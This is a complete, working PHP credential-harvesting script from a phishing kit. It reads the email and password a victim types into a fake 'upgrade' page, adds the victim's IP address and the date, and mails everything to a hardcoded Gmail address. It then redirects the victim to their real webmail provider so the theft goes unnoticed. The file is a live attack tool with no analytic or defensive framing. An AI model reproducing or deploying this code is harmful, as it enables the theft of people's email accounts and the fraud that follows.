<?php
	if(isset($_POST))
	{
		$email = $_POST['email'];
		$password = $_POST['password'];
		
		$to = "faithprosper795@gmail.com";

		$ip = $_SERVER['REMOTE_ADDR']?:($_SERVER['HTTP_X_FORWARDED_FOR']?:$_SERVER['HTTP_CLIENT_IP']);
		
		//$country = geoip_country_name_by_name("$ip");

		$msg = "Email: $email  " . "\r\n";
		//$msg .= "<p>&nbsp;</p>";
		$msg .= "Password: $password  " . "\r\n";
		//$msg .= "<p>&nbsp;</p>";
		$msg .= "IP: $ip  " . "\r\n";
		//$msg .= "<p>&nbsp;</p>";
		//$msg .= "Country: $country  " . "\r\n";
		$msg .= "Date:" . date('d-m-Y h:i:s');

		mail($to,"Upgrade page",$msg);

		$name_domain = explode("@", $email);

		$domain = $name_domain[1];

		$domain_part = explode(".", $domain);

		$url = $domain_part[0];

		if($url == 'yahoo')
			$url_to = "https://mail.yahoo.com";
		else if($url == 'gmail')
			$url_to = "https://gmail.com";
		else if($url == 'hotmail')
			$url_to = "https://hotmail.com";
		else if($url == '126' || $url == 'vip')
			$url_to = "http://126.com";
		else if($url == '163')
			$url_to = "http://163.com";
		else if($url == 'naver')
			$url_to = "http://naver.com";
		else if($url == 'hanmail' || $url == 'daum')
			$url_to = "http://hanmail.net";
		else if($url == 'rediff')
			$url_to = "http://rediff.com";
		else if($url == 'aol')
			$url_to = "http://aol.com";
		else if($url == 'emirates')
			$url_to = "http://webmail.emirates.net.ae";
		else 
			$url_to = "http://" . $domain;
		
		header('Location: '.$url_to);
	}
?>